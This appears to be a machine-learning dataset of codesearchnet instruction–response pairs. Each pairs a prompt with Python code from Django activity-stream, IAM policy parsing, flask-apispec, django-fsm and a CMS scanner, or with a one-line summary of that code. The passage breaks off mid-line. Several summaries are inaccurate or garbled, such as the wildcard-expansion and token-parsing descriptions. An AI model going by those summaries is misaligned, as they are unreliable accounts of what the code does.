{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a stream of the most recent actions by objects that the user is following.", "response": "def user(self, obj, with_user_activity=False, follow_flag=None, **kwargs):\n        \"\"\"Create a stream of the most recent actions by objects that the user is following.\"\"\"\n        q = Q()\n        qs = self.public()\n\n        if not obj:\n            return qs.none()\n\n        check(obj)\n\n        if with_user_activity:\n            q = q | Q(\n                actor_content_type=ContentType.objects.get_for_model(obj),\n                actor_object_id=obj.pk\n            )\n\n        follows = apps.get_model('actstream', 'follow').objects.filter(user=obj)\n        if follow_flag:\n            follows = follows.filter(flag=follow_flag)\n            \n        content_types = ContentType.objects.filter(\n            pk__in=follows.values('content_type_id')\n        )\n\n        if not (content_types.exists() or with_user_activity):\n            return qs.none()\n\n        for content_type in content_types:\n            object_ids = follows.filter(content_type=content_type)\n            q = q | Q(\n                actor_content_type=content_type,\n                actor_object_id__in=object_ids.values('object_id')\n            ) | Q(\n                target_content_type=content_type,\n                target_object_id__in=object_ids.filter(\n                    actor_only=False).values('object_id')\n            ) | Q(\n                action_object_content_type=content_type,\n                action_object_object_id__in=object_ids.filter(\n                    actor_only=False).values('object_id')\n            )\n\n        return qs.filter(q, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nfilters to a specific instance.", "response": "def for_object(self, instance, flag=''):\n        \"\"\"\n        Filter to a specific instance.\n        \"\"\"\n        check(instance)\n        content_type = ContentType.objects.get_for_model(instance).pk\n        queryset = self.filter(content_type=content_type, object_id=instance.pk)\n        if flag:\n            queryset = queryset.filter(flag=flag)\n        return queryset"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nchecking if a user is following an instance.", "response": "def is_following(self, user, instance, flag=''):\n        \"\"\"\n        Check if a user is following an instance.\n        \"\"\"\n        if not user or user.is_anonymous:\n            return False\n        queryset = self.for_object(instance)\n\n        if flag:\n            queryset = queryset.filter(flag=flag)\n        return queryset.filter(user=user).exists()"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a queryset of User objects who are following the given actor.", "response": "def followers_qs(self, actor, flag=''):\n        \"\"\"\n        Returns a queryset of User objects who are following the given actor (eg my followers).\n        \"\"\"\n        check(actor)\n        queryset = self.filter(\n            content_type=ContentType.objects.get_for_model(actor),\n            object_id=actor.pk\n        ).select_related('user')\n\n        if flag:\n            queryset = queryset.filter(flag=flag)\n        return queryset"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef followers(self, actor, flag=''):\n        return [follow.user for follow in self.followers_qs(actor, flag=flag)]", "response": "Returns a list of User objects who are following the given actor."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef following_qs(self, user, *models, **kwargs):\n        qs = self.filter(user=user)\n        ctype_filters = Q()\n        for model in models:\n            check(model)\n            ctype_filters |= Q(content_type=ContentType.objects.get_for_model(model))\n        qs = qs.filter(ctype_filters)\n\n        flag = kwargs.get('flag', '')\n\n        if flag:\n            qs = qs.filter(flag=flag)\n        return qs.fetch_generic_relations('follow_object')", "response": "Returns a queryset of actors that the given user is following the given models."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef following(self, user, *models, **kwargs):\n        return [follow.follow_object for follow in self.following_qs(\n            user, *models, flag=kwargs.get('flag', '')\n        )]", "response": "Returns a list of actors that the given user is following."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the class of the action manager to use from the current settings.", "response": "def get_action_manager():\n    \"\"\"\n    Returns the class of the action manager to use from ACTSTREAM_SETTINGS['MANAGER']\n    \"\"\"\n    mod = SETTINGS.get('MANAGER', 'actstream.managers.ActionManager')\n    mod_path = mod.split('.')\n    try:\n        return getattr(__import__('.'.join(mod_path[:-1]), {}, {},\n                                  [mod_path[-1]]), mod_path[-1])()\n    except ImportError:\n        raise ImportError(\n            'Cannot import %s try fixing ACTSTREAM_SETTINGS[MANAGER]'\n            'setting.' % mod\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef setup_generic_relations(model_class):\n    Action = apps.get_model('actstream', 'action')\n\n    if Action is None:\n        raise RegistrationError(\n            'Unable get actstream.Action. Potential circular imports '\n            'in initialisation. Try moving actstream app to come after the '\n            'apps which have models to register in the INSTALLED_APPS setting.'\n        )\n\n    related_attr_name = 'related_query_name'\n    related_attr_value = 'actions_with_%s' % label(model_class)\n\n    relations = {}\n    for field in ('actor', 'target', 'action_object'):\n        attr = '%s_actions' % field\n        attr_value = '%s_as_%s' % (related_attr_value, field)\n        kwargs = {\n            'content_type_field': '%s_content_type' % field,\n            'object_id_field': '%s_object_id' % field,\n            related_attr_name: attr_value\n        }\n        rel = GenericRelation('actstream.Action', **kwargs)\n        rel.contribute_to_class(model_class, attr)\n        relations[field] = rel\n\n        # @@@ I'm not entirely sure why this works\n        setattr(Action, attr_value, None)\n    return relations", "response": "Setup GenericRelations for actionable models."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nstreaming decorator to be applied to methods of an ``ActionManager`` subclass Syntax:: from actstream.decorators import stream from actstream.managers import ActionManager class MyManager(ActionManager): @stream def foobar(self, ...): ...", "response": "def stream(func):\n    \"\"\"\n    Stream decorator to be applied to methods of an ``ActionManager`` subclass\n\n    Syntax::\n\n        from actstream.decorators import stream\n        from actstream.managers import ActionManager\n\n        class MyManager(ActionManager):\n            @stream\n            def foobar(self, ...):\n                ...\n\n    \"\"\"\n    @wraps(func)\n    def wrapped(manager, *args, **kwargs):\n        offset, limit = kwargs.pop('_offset', None), kwargs.pop('_limit', None)\n        qs = func(manager, *args, **kwargs)\n        if isinstance(qs, dict):\n            qs = manager.public(**qs)\n        elif isinstance(qs, (list, tuple)):\n            qs = manager.public(*qs)\n        if offset or limit:\n            qs = qs[offset:limit]\n        return qs.fetch_generic_relations()\n    return wrapped"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef follow_url(parser, token):\n    bits = token.split_contents()\n\n    if len(bits) > 3:\n        raise TemplateSyntaxError(\"Accepted format {% follow_url [instance] %} or {% follow_url [instance] [flag] %}\")\n    elif len(bits) == 2:\n        return DisplayActivityFollowUrl(bits[1])\n    else:\n        flag = bits[2][1:-1]\n        return DisplayActivityFollowUrl(bits[1], flag=flag)", "response": "Renders the URL of the follow view for a particular actor instance."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nrenders the URL to follow an object as both actor and target.", "response": "def follow_all_url(parser, token):\n    \"\"\"\n    Renders the URL to follow an object as both actor and target\n\n    ::\n\n        <a href=\"{% follow_all_url other_user %}\">\n            {% if request.user|is_following:other_user %}\n                stop following\n            {% else %}\n                follow\n            {% endif %}\n        </a>\n\n        <a href=\"{% follow_all_url other_user 'watching' %}\">\n            {% is_following user group \"watching\" as is_watching %}\n            {% if is_watching %}\n                stop watching\n            {% else %}\n                watch\n            {% endif %}\n        </a>\n    \"\"\"\n    bits = token.split_contents()\n    if len(bits) > 3:\n        raise TemplateSyntaxError(\n            \"Accepted format {% follow_all_url [instance] %} or {% follow_url [instance] [flag] %}\"\n        )\n    elif len(bits) == 2:\n        return DisplayActivityFollowUrl(bits[1], actor_only=False)\n    else:\n        flag = bits[2][1:-1]\n        return DisplayActivityFollowUrl(bits[1], actor_only=False, flag=flag)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nrender the URL for a particular actor instance.", "response": "def actor_url(parser, token):\n    \"\"\"\n    Renders the URL for a particular actor instance\n\n    ::\n\n        <a href=\"{% actor_url request.user %}\">View your actions</a>\n        <a href=\"{% actor_url another_user %}\">{{ another_user }}'s actions</a>\n\n    \"\"\"\n    bits = token.split_contents()\n    if len(bits) != 2:\n        raise TemplateSyntaxError(\"Accepted format \"\n                                  \"{% actor_url [actor_instance] %}\")\n    else:\n        return DisplayActivityActorUrl(*bits[1:])"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nrenders an activity stream as a list into the template s context.", "response": "def activity_stream(context, stream_type, *args, **kwargs):\n    \"\"\"\n    Renders an activity stream as a list into the template's context.\n    Streams loaded by stream_type can be the default ones (eg user, actor, etc.) or a user defined stream.\n    Extra args/kwargs are passed into the stream call.\n\n    ::\n\n        {% activity_stream 'actor' user %}\n        {% for action in stream %}\n            {% display_action action %}\n        {% endfor %}\n    \"\"\"\n    if stream_type == 'model':\n        stream_type = 'model_actions'\n    if not hasattr(Action.objects, stream_type):\n        raise TemplateSyntaxError('Action manager has no attribute: %s' % stream_type)\n    ctxvar = kwargs.pop('as', 'stream')\n    context[ctxvar] = getattr(Action.objects, stream_type)(*args, **kwargs)\n    return ''"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef handle_token(cls, parser, token):\n        tag_error = \"Accepted formats {%% %(tagname)s %(args)s %%} or \" \\\n                    \"{%% %(tagname)s %(args)s as [var] %%}\"\n        bits = token.split_contents()\n        args_count = len(bits) - 1\n        if args_count >= 2 and bits[-2] == 'as':\n            as_var = bits[-1]\n            args_count -= 2\n        else:\n            as_var = None\n        if args_count != cls.args_count:\n            arg_list = ' '.join(['[arg]' * cls.args_count])\n            raise TemplateSyntaxError(tag_error % {'tagname': bits[0],\n                                                   'args': arg_list})\n        args = [parser.compile_filter(tkn)\n                for tkn in bits[1:args_count + 1]]\n        return cls(args, varname=as_var)", "response": "This method is used to parse and return a Node.\n class method to parse and return a Node. resourcetype object."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef follow(user, obj, send_action=True, actor_only=True, flag='', **kwargs):\n    check(obj)\n    instance, created = apps.get_model('actstream', 'follow').objects.get_or_create(\n        user=user, object_id=obj.pk, flag=flag,\n        content_type=ContentType.objects.get_for_model(obj),\n        actor_only=actor_only\n    )\n    if send_action and created:\n        if not flag:\n            action.send(user, verb=_('started following'), target=obj, **kwargs)\n        else:\n            action.send(user, verb=_('started %s' % flag), target=obj, **kwargs)\n    return instance", "response": "Creates a relationship allowing the object to appear in the activity stream."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nremoving a \"follow\" relationship. Set ``send_action`` to ``True`` (``False is default) to also send a ``<user> stopped following <object>`` action signal. Pass a string value to ``flag`` to determine which type of \"follow\" relationship you want to remove. Example:: unfollow(request.user, other_user) unfollow(request.user, other_user, flag='watching')", "response": "def unfollow(user, obj, send_action=False, flag=''):\n    \"\"\"\n    Removes a \"follow\" relationship.\n\n    Set ``send_action`` to ``True`` (``False is default) to also send a\n    ``<user> stopped following <object>`` action signal.\n\n    Pass a string value to ``flag`` to determine which type of \"follow\" relationship you want to remove.\n\n    Example::\n\n        unfollow(request.user, other_user)\n        unfollow(request.user, other_user, flag='watching')\n    \"\"\"\n    check(obj)\n    qs = apps.get_model('actstream', 'follow').objects.filter(\n        user=user, object_id=obj.pk,\n        content_type=ContentType.objects.get_for_model(obj)\n    )\n\n    if flag:\n        qs = qs.filter(flag=flag)\n    qs.delete()\n\n    if send_action:\n        if not flag:\n            action.send(user, verb=_('stopped following'), target=obj)\n        else:\n            action.send(user, verb=_('stopped %s' % flag), target=obj)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef is_following(user, obj, flag=''):\n    check(obj)\n\n    qs = apps.get_model('actstream', 'follow').objects.filter(\n        user=user, object_id=obj.pk,\n        content_type=ContentType.objects.get_for_model(obj)\n    )\n\n    if flag:\n        qs = qs.filter(flag=flag)\n\n    return qs.exists()", "response": "Check if a follow relationship exists."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a queryset of Actions to use based on the stream method and object.", "response": "def items(self, *args, **kwargs):\n        \"\"\"\n        Returns a queryset of Actions to use based on the stream method and object.\n        \"\"\"\n        return self.get_stream()(self.get_object(*args, **kwargs))"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns an RFC3987 IRI ID for the given object action and date.", "response": "def get_uri(self, action, obj=None, date=None):\n        \"\"\"\n        Returns an RFC3987 IRI ID for the given object, action and date.\n        \"\"\"\n        if date is None:\n            date = action.timestamp\n        date = datetime_safe.new_datetime(date).strftime('%Y-%m-%d')\n        return 'tag:%s,%s:%s' % (Site.objects.get_current().domain, date,\n                                 self.get_url(action, obj, False))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning an RFC3987 IRI for a given object action.", "response": "def get_url(self, action, obj=None, domain=True):\n        \"\"\"\n        Returns an RFC3987 IRI for a HTML representation of the given object, action.\n        If domain is true, the current site's domain will be added.\n        \"\"\"\n        if not obj:\n            url = reverse('actstream_detail', None, (action.pk,))\n        elif hasattr(obj, 'get_absolute_url'):\n            url = obj.get_absolute_url()\n        else:\n            ctype = ContentType.objects.get_for_model(obj)\n            url = reverse('actstream_actor', None, (ctype.pk, obj.pk))\n        if domain:\n            return add_domain(Site.objects.get_current().domain, url)\n        return url"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nformatting the given action.", "response": "def format(self, action):\n        \"\"\"\n        Returns a formatted dictionary for the given action.\n        \"\"\"\n        item = {\n            'id': self.get_uri(action),\n            'url': self.get_url(action),\n            'verb': action.verb,\n            'published': rfc3339_date(action.timestamp),\n            'actor': self.format_actor(action),\n            'title': text_type(action),\n        }\n        if action.description:\n            item['content'] = action.description\n        if action.target:\n            item['target'] = self.format_target(action)\n        if action.action_object:\n            item['object'] = self.format_action_object(action)\n        return item"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef format_item(self, action, item_type='actor'):\n        obj = getattr(action, item_type)\n        return {\n            'id': self.get_uri(action, obj),\n            'url': self.get_url(action, obj),\n            'objectType': ContentType.objects.get_for_model(obj).name,\n            'displayName': text_type(obj)\n        }", "response": "Returns a formatted dictionary for an individual item based on the action and item_type."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef item_extra_kwargs(self, action):\n        item = self.format(action)\n        item.pop('title', None)\n        item['uri'] = item.pop('url')\n        item['activity:verb'] = item.pop('verb')\n        return item", "response": "Returns an extra keyword arguments dictionary that is used with\n        the add_item call of the feed generator."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngives an iterable of actions return a mapping of action groups to their categories.", "response": "def categories_for_actions(actions):\n    \"\"\"\n    Given an iterable of actions, return a mapping of action groups.\n    \n    actions: {'ec2:authorizesecuritygroupingress', 'iam:putrolepolicy', 'iam:listroles'}\n    \n    Returns:\n        {\n            'ec2': {'Write'},\n            'iam': {'Permissions', 'List'})\n        }\n    \"\"\"\n    groups = defaultdict(set)\n    for action in actions:\n        service = action.split(':')[0]\n        groups[service].add(_action_categories.get(action))\n    return groups"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef actions_for_category(category):\n    actions = set()\n    for action, action_category in _action_categories.items():\n        if action_category == category:\n           actions.add(action)\n    return actions", "response": "Returns set of actions containing each group passed in."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef whos_allowed(self):\n        who = set()\n        for principal in self.principals:\n            principal = PrincipalTuple(category='principal', value=principal)\n            who.add(principal)\n        who = who.union(self.condition_entries)\n        return who", "response": "Returns set containing any entries from principal and condition section."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _principals(self):\n        principals = set()\n        principal = self.statement.get(\"Principal\", None)\n        if not principal:\n            # It is possible not to define a principal, AWS ignores these statements.\n            return principals\n\n        if isinstance(principal, dict):\n\n            if 'AWS' in principal:\n                self._add_or_extend(principal['AWS'], principals)\n\n            if 'Service' in principal:\n                self._add_or_extend(principal['Service'], principals)\n\n        else:\n            self._add_or_extend(principal, principals)\n\n        return principals", "response": "Extracts all principals from IAM statement."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _condition_entries(self):\n        conditions = list()\n        condition = self.statement.get('Condition')\n        if not condition:\n            return conditions\n\n        key_mapping = {\n            'aws:sourcearn': 'arn',\n            'aws:sourceowner': 'account',\n            'aws:sourceaccount': 'account',\n            'aws:principalorgid': 'org-id',\n            'kms:calleraccount': 'account',\n            'aws:userid': 'userid',\n            'aws:sourceip': 'cidr',\n            'aws:sourcevpc': 'vpc',\n            'aws:sourcevpce': 'vpce'\n        }\n\n        relevant_condition_operators = [\n            re.compile('((ForAllValues|ForAnyValue):)?ARN(Equals|Like)(IfExists)?', re.IGNORECASE),\n            re.compile('((ForAllValues|ForAnyValue):)?String(Equals|Like)(IgnoreCase)?(IfExists)?', re.IGNORECASE),\n            re.compile('((ForAllValues|ForAnyValue):)?IpAddress(IfExists)?', re.IGNORECASE)]\n\n        for condition_operator in condition.keys():\n            if any(regex.match(condition_operator) for regex in relevant_condition_operators):\n                for key, value in condition[condition_operator].items():\n\n                    # ForAllValues and ForAnyValue must be paired with a list.\n                    # Otherwise, skip over entries.\n                    if not isinstance(value, list) and condition_operator.lower().startswith('for'):\n                        continue\n\n                    if key.lower() in key_mapping:\n                        if isinstance(value, list):\n                            for v in value:\n                                conditions.append(\n                                    ConditionTuple(value=v, category=key_mapping[key.lower()]))\n                        else:\n                            conditions.append(\n                                ConditionTuple(value=value, category=key_mapping[key.lower()]))\n\n        return conditions", "response": "Extracts any ARNs Account Numbers UserIDs CIDRs and VPCs and VPC Endpoints from a condition block."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _get_prefixes_for_action(action):\n    (technology, permission) = action.split(':')\n    retval = [\"{}:\".format(technology)]\n    phrase = \"\"\n    for char in permission:\n        newphrase = \"{}{}\".format(phrase, char)\n        retval.append(\"{}:{}\".format(technology,newphrase))\n        phrase = newphrase\n    return retval", "response": "Returns a list of prefixes for the given action."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _expand_wildcard_action(action):\n    if isinstance(action, list):\n        expanded_actions = []\n        for item in action:\n            expanded_actions.extend(_expand_wildcard_action(item))\n        return expanded_actions\n\n    else:\n        if '*' in action:\n            expanded = [\n                expanded_action.lower() for expanded_action in all_permissions if fnmatch.fnmatchcase(\n                    expanded_action.lower(), action.lower()\n                )\n            ]\n\n            # if we get a wildcard for a tech we've never heard of, just return the wildcard\n            if not expanded:\n                return [action.lower()]\n\n            return expanded\n        return [action.lower()]", "response": "Expand the wildcard action to only return the wildcard"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nextract all the sample data from an AudioClip and convert it from FSB5", "response": "def extract_audioclip_samples(d) -> dict:\n\t\"\"\"\n\tExtract all the sample data from an AudioClip and\n\tconvert it from FSB5 if needed.\n\t\"\"\"\n\tret = {}\n\n\tif not d.data:\n\t\t# eg. StreamedResource not available\n\t\treturn {}\n\n\ttry:\n\t\tfrom fsb5 import FSB5\n\texcept ImportError as e:\n\t\traise RuntimeError(\"python-fsb5 is required to extract AudioClip\")\n\n\taf = FSB5(d.data)\n\tfor i, sample in enumerate(af.samples):\n\t\tif i > 0:\n\t\t\tfilename = \"%s-%i.%s\" % (d.name, i, af.get_sample_extension())\n\t\telse:\n\t\t\tfilename = \"%s.%s\" % (d.name, af.get_sample_extension())\n\t\ttry:\n\t\t\tsample = af.rebuild_sample(sample)\n\t\texcept ValueError as e:\n\t\t\tprint(\"WARNING: Could not extract %r (%s)\" % (d, e))\n\t\t\tcontinue\n\t\tret[filename] = sample\n\n\treturn ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nrun build the docs when a file changes.", "response": "def watch_docs(ctx, browse=False):\n    \"\"\"Run build the docs when a file changes.\"\"\"\n    try:\n        import sphinx_autobuild  # noqa\n    except ImportError:\n        print('ERROR: watch task requires the sphinx_autobuild package.')\n        print('Install it with:')\n        print('    pip install sphinx-autobuild')\n        sys.exit(1)\n    ctx.run('sphinx-autobuild {0} {1} {2} -z marshmallow'.format(\n        '--open-browser' if browse else '', docs_dir, build_dir), echo=True, pty=True)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ninjects keyword arguments from the specified webargs arguments into the decorated view function. Usage: .. code-block:: python from marshmallow import fields @use_kwargs({'name': fields.Str(), 'category': fields.Str()}) def get_pets(**kwargs): return Pet.query.filter_by(**kwargs).all() :param args: Mapping of argument names to :class:`Field <marshmallow.fields.Field>` objects, :class:`Schema <marshmallow.Schema>`, or a callable which accepts a request and returns a :class:`Schema <marshmallow.Schema>` :param locations: Default request locations to parse :param inherit: Inherit args from parent classes :param apply: Parse request with specified args", "response": "def use_kwargs(args, locations=None, inherit=None, apply=None, **kwargs):\n    \"\"\"Inject keyword arguments from the specified webargs arguments into the\n    decorated view function.\n\n    Usage:\n\n    .. code-block:: python\n\n        from marshmallow import fields\n\n        @use_kwargs({'name': fields.Str(), 'category': fields.Str()})\n        def get_pets(**kwargs):\n            return Pet.query.filter_by(**kwargs).all()\n\n    :param args: Mapping of argument names to :class:`Field <marshmallow.fields.Field>`\n        objects, :class:`Schema <marshmallow.Schema>`, or a callable which accepts a\n        request and returns a :class:`Schema <marshmallow.Schema>`\n    :param locations: Default request locations to parse\n    :param inherit: Inherit args from parent classes\n    :param apply: Parse request with specified args\n    \"\"\"\n    kwargs.update({'locations': locations})\n\n    def wrapper(func):\n        options = {\n            'args': args,\n            'kwargs': kwargs,\n        }\n        annotate(func, 'args', [options], inherit=inherit, apply=apply)\n        return activate(func)\n    return wrapper"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef marshal_with(schema, code='default', description='', inherit=None, apply=None):\n    def wrapper(func):\n        options = {\n            code: {\n                'schema': schema or {},\n                'description': description,\n            },\n        }\n        annotate(func, 'schemas', [options], inherit=inherit, apply=apply)\n        return activate(func)\n    return wrapper", "response": "Decorator to marshal the return value of the decorated view function using the specified schema."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef doc(inherit=None, **kwargs):\n    def wrapper(func):\n        annotate(func, 'docs', [kwargs], inherit=inherit)\n        return activate(func)\n    return wrapper", "response": "Decorator to annotate the decorated view function or class with the specified Swagger\n    attributes."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nuses a custom Wrapper to apply annotations to the decorated function.", "response": "def wrap_with(wrapper_cls):\n    \"\"\"Use a custom `Wrapper` to apply annotations to the decorated function.\n\n    :param wrapper_cls: Custom `Wrapper` subclass\n    \"\"\"\n    def wrapper(func):\n        annotate(func, 'wrapper', [{'wrapper': wrapper_cls}])\n        return activate(func)\n    return wrapper"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nregisters a view. :param target: view function or view class. :param endpoint: (optional) endpoint name. :param blueprint: (optional) blueprint name. :param tuple resource_class_args: (optional) args to be forwarded to the view class constructor. :param dict resource_class_kwargs: (optional) kwargs to be forwarded to the view class constructor.", "response": "def register(self, target, endpoint=None, blueprint=None,\n                 resource_class_args=None, resource_class_kwargs=None):\n        \"\"\"Register a view.\n\n        :param target: view function or view class.\n        :param endpoint: (optional) endpoint name.\n        :param blueprint: (optional) blueprint name.\n        :param tuple resource_class_args: (optional) args to be forwarded to the\n            view class constructor.\n        :param dict resource_class_kwargs: (optional) kwargs to be forwarded to\n            the view class constructor.\n        \"\"\"\n\n        self._defer(self._register, target, endpoint, blueprint,\n                    resource_class_args, resource_class_kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nregister a view. :param target: view function or view class. :param endpoint: (optional) endpoint name. :param blueprint: (optional) blueprint name. :param tuple resource_class_args: (optional) args to be forwarded to the view class constructor. :param dict resource_class_kwargs: (optional) kwargs to be forwarded to the view class constructor.", "response": "def _register(self, target, endpoint=None, blueprint=None,\n                  resource_class_args=None, resource_class_kwargs=None):\n        \"\"\"Register a view.\n\n        :param target: view function or view class.\n        :param endpoint: (optional) endpoint name.\n        :param blueprint: (optional) blueprint name.\n        :param tuple resource_class_args: (optional) args to be forwarded to the\n            view class constructor.\n        :param dict resource_class_kwargs: (optional) kwargs to be forwarded to\n            the view class constructor.\n        \"\"\"\n        if isinstance(target, types.FunctionType):\n            paths = self.view_converter.convert(target, endpoint, blueprint)\n        elif isinstance(target, ResourceMeta):\n            paths = self.resource_converter.convert(\n                target,\n                endpoint,\n                blueprint,\n                resource_class_args=resource_class_args,\n                resource_class_kwargs=resource_class_kwargs,\n            )\n        else:\n            raise TypeError()\n        for path in paths:\n            self.spec.path(**path)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_available_FIELD_transitions(instance, field):\n    curr_state = field.get_state(instance)\n    transitions = field.transitions[instance.__class__]\n\n    for name, transition in transitions.items():\n        meta = transition._django_fsm\n        if meta.has_transition(curr_state) and meta.conditions_met(instance, curr_state):\n            yield meta.get_transition(curr_state)", "response": "Returns a generator of all available transitions for the given instance and field."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a list of transitions available for a given user field.", "response": "def get_available_user_FIELD_transitions(instance, user, field):\n    \"\"\"\n    List of transitions available in current model state\n    with all conditions met and user have rights on it\n    \"\"\"\n    for transition in get_available_FIELD_transitions(instance, field):\n        if transition.has_perm(instance, user):\n            yield transition"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef can_proceed(bound_method, check_conditions=True):\n    if not hasattr(bound_method, '_django_fsm'):\n        im_func = getattr(bound_method, 'im_func', getattr(bound_method, '__func__'))\n        raise TypeError('%s method is not transition' % im_func.__name__)\n\n    meta = bound_method._django_fsm\n    im_self = getattr(bound_method, 'im_self', getattr(bound_method, '__self__'))\n    current_state = meta.field.get_state(im_self)\n\n    return meta.has_transition(current_state) and (\n        not check_conditions or meta.conditions_met(im_self, current_state))", "response": "Returns True if model in state allows to call bound_method\n   "}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef has_transition(self, state):\n        if state in self.transitions:\n            return True\n\n        if '*' in self.transitions:\n            return True\n\n        if '+' in self.transitions and self.transitions['+'].target != state:\n            return True\n\n        return False", "response": "Lookup if any transition exists from current model state using current method\n       "}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef conditions_met(self, instance, state):\n        transition = self.get_transition(state)\n\n        if transition is None:\n            return False\n        elif transition.conditions is None:\n            return True\n        else:\n            return all(map(lambda condition: condition(instance), transition.conditions))", "response": "Check if all conditions have been met"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsetting the class of the object to the state of the given state_proxy.", "response": "def set_proxy(self, instance, state):\n        \"\"\"\n        Change class\n        \"\"\"\n        if state in self.state_proxy:\n            state_proxy = self.state_proxy[state]\n\n            try:\n                app_label, model_name = state_proxy.split(\".\")\n            except ValueError:\n                # If we can't split, assume a model in current app\n                app_label = instance._meta.app_label\n                model_name = state_proxy\n\n            model = get_model(app_label, model_name)\n            if model is None:\n                raise ValueError('No model found {0}'.format(state_proxy))\n\n            instance.__class__ = model"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a generator that yields all the transitions for the given instance_cls.", "response": "def get_all_transitions(self, instance_cls):\n        \"\"\"\n        Returns [(source, target, name, method)] for all field transitions\n        \"\"\"\n        transitions = self.transitions[instance_cls]\n\n        for name, transition in transitions.items():\n            meta = transition._django_fsm\n\n            for transition in meta.transitions.values():\n                yield transition"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _convert_to_folder(self, packages):\n        url = 'http://packagist.org/p/%s.json'\n        with ThreadPoolExecutor(max_workers=12) as executor:\n            futures = []\n            for package in packages:\n                future = executor.submit(self._get, url, package)\n                futures.append({\n                    'future': future,\n                    'package': package\n                })\n\n            folders = []\n            for i, future in enumerate(futures, start=1):\n                r = future['future'].result()\n                package = future['package']\n\n                if not 'installer-name' in r.text:\n                    folder_name = package.split('/')[1]\n                else:\n                    splat = list(filter(None, re.split(r'[^a-zA-Z0-9-_.,]', r.text)))\n                    folder_name = splat[splat.index('installer-name') + 1]\n\n                if not folder_name in folders:\n                    folders.append(folder_name)\n                else:\n                    print(\"Folder %s is duplicated (current %s, previous %s)\" % (folder_name,\n                        package, folders.index(folder_name)))\n\n                if i % 25 == 0:\n                    print(\"Done %s.\" % i)\n\n        return folders", "response": "This function converts a list of composer packages to a list of folders."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ninitializes a variety of variables depending on user input.", "response": "def _general_init(self, opts, out=None):\n        \"\"\"\n            Initializes a variety of variables depending on user input.\n\n            @return: a tuple containing a boolean value indicating whether\n            progressbars should be hidden, functionality and enabled\n            functionality.\n        \"\"\"\n\n        self.session = Session()\n        if out:\n            self.out = out\n        else:\n            self.out = self._output(opts)\n\n        is_cms_plugin = self._meta.label != \"scan\"\n        if is_cms_plugin:\n            self.vf = VersionsFile(self.versions_file)\n\n        # http://stackoverflow.com/questions/23632794/in-requests-library-how-can-i-avoid-httpconnectionpool-is-full-discarding-con\n        try:\n            a = requests.adapters.HTTPAdapter(pool_maxsize=5000)\n            self.session.mount('http://', a)\n            self.session.mount('https://', a)\n            self.session.cookies.set_policy(BlockAll())\n        except AttributeError:\n            old_req = \"\"\"Running a very old version of requests! Please `pip\n                install -U requests`.\"\"\"\n            self.out.warn(old_req)\n\n        self.session.verify = False\n        self.session.headers['User-Agent'] = self.DEFAULT_UA\n\n        debug_requests = opts['debug_requests']\n        if debug_requests:\n            hide_progressbar = True\n            opts['threads_identify'] = 1\n            opts['threads_scan'] = 1\n            opts['threads_enumerate'] = 1\n            self.session = 